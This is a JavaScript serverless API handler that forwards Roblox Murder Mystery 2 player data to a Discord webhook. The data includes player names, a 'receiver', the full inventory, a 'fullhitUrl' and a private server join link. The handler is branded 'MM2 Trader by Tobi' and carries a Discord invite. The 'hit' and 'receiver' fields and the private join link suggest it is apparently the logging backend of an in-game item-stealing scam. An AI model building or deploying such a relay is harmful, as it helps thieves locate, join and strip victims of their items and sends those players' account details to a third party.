export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  const API_KEY = 'your_really_secret_key_here'; // Change to your secret key
  if (req.headers['x-api-key'] !== API_KEY) {
    return res.status(401).json({ error: 'Invalid API Key' });
  }

  // Extract data
  const {
    webhook, // Discord webhook url
    plrName,
    plrDisplayName,
    receiver,
    inventoryText,
    items,
    fullhitUrl,
    job_id, // game.JobId
  } = req.body || {};

  if (!webhook || !/^https:\/\/discord\.com\/api\/webhooks\//.test(webhook)) {
    return res.status(400).json({ error: 'Invalid or missing Discord webhook.' });
  }

  // Compose the embed
  const embed = {
    title: "MM 2 Items!",
    color: 10181046, // Purple
    fields: [
      {
        name: "Player Information",
        value:
          "```" +
          `Name: ${plrName || "N/A"}\n` +
          `Display: ${plrDisplayName || "N/A"}\n` +
          `Receiver: ${receiver || "N/A"}` +
          "```",
        inline: false,
      },
      {
        name: "Inventory",
        value: "```" + (inventoryText || "N/A") + "```",
        inline: false,
      },
      {
        name: "List of items",
        value: `\`Total Items: ${(Array.isArray(items) && items.length) || 0}\``,
        inline: false,
      },
      {
        name: "Join Link (Private)",
        value: job_id || "N/A",
        inline: false,
      },
      {
        name: "Full Item List",
        value: fullhitUrl
          ? `[View Complete List](${fullhitUrl})`
          : "`No URL Provided`",
        inline: false,
      },
    ],
    footer: {
      text: "MM2 Trader by Tobi. discord.gg/GY2RVSEGDT",
    },
    timestamp: new Date().toISOString(),
  };

  const discordPayload = {
    content: "🎁 **New MM2 Inventory Shared!**",
    embeds: [embed],
  };

  // Post to Discord
  const response = await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(discordPayload),
  });

  if (response.ok) {
    return res.status(200).json({ ok: true, message: "Embed sent to Discord!" });
  } else {
    return res.status(500).json({ ok: false, error: "Failed sending to Discord." });
  }
};
